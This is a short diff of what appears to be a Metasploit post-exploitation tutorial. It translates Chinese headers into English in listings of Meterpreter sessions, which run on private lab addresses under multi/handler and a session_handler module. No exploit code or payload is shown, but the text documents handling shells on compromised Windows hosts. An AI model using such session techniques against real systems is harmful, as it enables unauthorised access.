@@ -5,10 +5,10 @@ frist you need get a meretpreter session
 ```bash
 msf6 exploit(multi/handler) > sessions 
 
-活动会话
+sessions
 ============
 
-  Id  名称    类型                     信息           连接
+  Id  Name    Type                     Info           Connection
   --  ------    ------                     ------           ------
   1           meterpreter x86/windows  w-PC\w @ W-PC  192.168.56.1:4444 -> 192.168.56.102:49402 (192.168.56.102)
 ```
@@ -62,7 +62,7 @@ Nmap done: 1 IP address (1 host up) scanned in 0.03 seconds
 msf6 exploit(multi/session_handler) > [*] Meterpreter session 3 opened (192.168.56.1:14444 -> 192.168.56.1:40977) at 2022-07-30 17:32:46 +0800
 msf6 exploit(multi/session_handler) > 
 msf6 exploit(multi/session_handler) > sessions 
-活动会话
+sessions
 ============
 
   Id  Nmae  Type                     Info                                                                    Connection
